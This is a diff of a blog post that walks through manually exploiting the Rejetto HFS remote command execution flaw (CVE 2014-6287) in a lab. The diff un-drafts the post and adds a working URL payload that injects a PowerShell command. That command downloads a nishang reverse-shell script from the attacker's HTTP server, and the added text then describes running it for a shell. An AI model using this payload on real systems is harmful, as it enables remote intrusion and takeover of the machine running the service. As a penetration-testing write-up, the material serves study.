@@ -1,9 +1,9 @@
 ---
 layout: post
-title:  "Rejetto HFS Remote Command Execution CVE2014-6287"
+title:  "Rejetto HFS Remote Command Execution CVE 2014-6287"
 categories: [Vulnerabilities]
 tags: [command execution, exploit, python]
-draft: true
+draft: false
 ---
 
 ### Introduction
@@ -102,7 +102,7 @@ listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
 12:11:59.731918 IP LinxzSecKali > 192.168.139.1: ICMP echo reply, id 1, seq 35, length 40
 ```
 
-Next we need to exploit this vulnerability in order to get a reverse shell, we know the RCE is there so let's figure out how we can leverage that to get full access to the account that's running the service. So, as we've mentioned the next step was to get a reverse shell! I came across the [following repo](https://github.com/samratashok/nishang) made by Samratashok which contains a lot of different PowerShell tools for offensive pen-testing. We're going to use some of these tools as there is one in here that will allow us to create a reverse shell on the target device, this is helpful because it means we don't have to build a script ourselves. (Yes I realise this section is "manual exploitation" however I think using a script here is much more efficient.)
+Next we need to exploit this vulnerability in order to get a reverse shell, we know the RCE is there so let's figure out how we can leverage that to get full access to the account that's running the service. So, as we've mentioned the next step was to get a reverse shell! I came across the [following repo](https://github.com/samratashok/nishang) made by Samratashok which contains a lot of different PowerShell tools for offensive pen-testing. We're going to use some of these tools as there is one in here that will allow us to create a reverse shell on the target device, this is helpful because it means we don't have to build a script ourselves.
 
 So, we have the script, now we need to figure out how we can serve it to the target device so that we can send a payload to execute it. Well, we can use a variety of methods, in this case I'm going to use [SimpleHTTPServer.py](https://github.com/LinxzFade/Python-Hacking-Tools/blob/master/SimpleHTTPServer/SimpleHTTPServer.py) to achieve this. Basically, the script above is going to setup a HTTP Server on the specified port, and give any machine access to the directory that it's running in on that port, see where I'm going with this? Firstly, let's test our victim machine can access our attacking machine while we run `SimpleHTTPServer.py` in order to do this I am going to send the following PowerShell command to the device via my browser.
 
@@ -122,11 +122,13 @@ root@LinxzSecKali:~/Documents/Scripts/Python# python3 SimpleHTTPServer.py 8000
 192.168.139.1 - - [27/Nov/2018 18:39:04] "GET /test HTTP/1.1" 404 -
 ```
 
-but, that doesn't matter! We expected that behaviour and now we know that our python HTTP server is working, we can now use this to get the victim to download our PowerShell reverse shell script that we briefly mentioned earlier
+but, that doesn't matter! We expected that behaviour and now we know that our python HTTP server is working, we can now use this to get the victim to download our PowerShell reverse shell script that we briefly mentioned earlier.
 
-#### Metasploit Exploitation
+```PowerShell
+http://192.168.139.1/?search=%00{.exec|+C:\WINDOWS\Sysnative\WindowsPowerShell\v1.0\powershell.exe%20-NoProfile%20-ExecutionPolicy%20unrestricted%20-Command%20(new-object%20System.Net.WebClient).Downloadfile(%27http://192.168.139.138:8000/Invoke-PowerShellTcpOneLine.ps1%27,%20%27C:\windows\temp\Invoke-PowerShellTcpOneLine.ps1%27).}
+```
 
-### Python Exploitation
+Now we use the the same logic to execute our reverse shell while running a listener and we will get a shell on the machine, EZ!
 
 ### References
 
